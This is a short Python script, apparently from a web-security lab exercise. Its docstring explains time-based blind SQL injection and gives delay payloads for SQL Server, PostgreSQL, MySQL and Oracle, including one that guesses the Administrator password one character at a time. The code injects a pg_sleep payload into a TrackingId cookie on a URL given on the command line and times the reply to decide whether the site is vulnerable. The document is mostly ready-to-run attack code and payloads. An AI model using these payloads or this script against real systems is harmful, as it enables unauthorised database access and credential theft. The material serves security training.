"""
techniques for triggering a time delay are specific to the type of database being used.

on Microsoft SQL Server, you can use the following to test a condition and trigger a delay depending on whether the expression is true: 

'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--

'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--

Postgresql example:
pg_sleep(10) is used in time-based blind SQL injection.
It pauses database execution for 10 seconds

Mysql example:
SLEEP(10) 


Oracle uses 
DBMS_LOCK.SLEEP(seconds)

SQL server uses 
WAITFOR DELAY '0:0:10'
"""

import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def blind_sqli_check(url):
    sqli_payload = "' || (SELECT pg_sleep(10))--"
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
    cookies = {'TrackingId': 'fY3mWGvtddfW37rS' + sqli_payload_encoded, 'session': '3tjAqEsmAUv1oSufDDKMp8Dpr9LKqwcd'}
    r = requests.get(url, cookies=cookies, verify=False)
    if int(r.elapsed.total_seconds()) > 10:
        print("(+) Vulnerable to blind-based SQL injection")
    else:
        print("(-) Not vulnerable to blind based SQL injection")


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Checking if tracking cookie is vulnerable to time-based blind SQLi....")
    blind_sqli_check(url)

if __name__ == "__main__":
    main()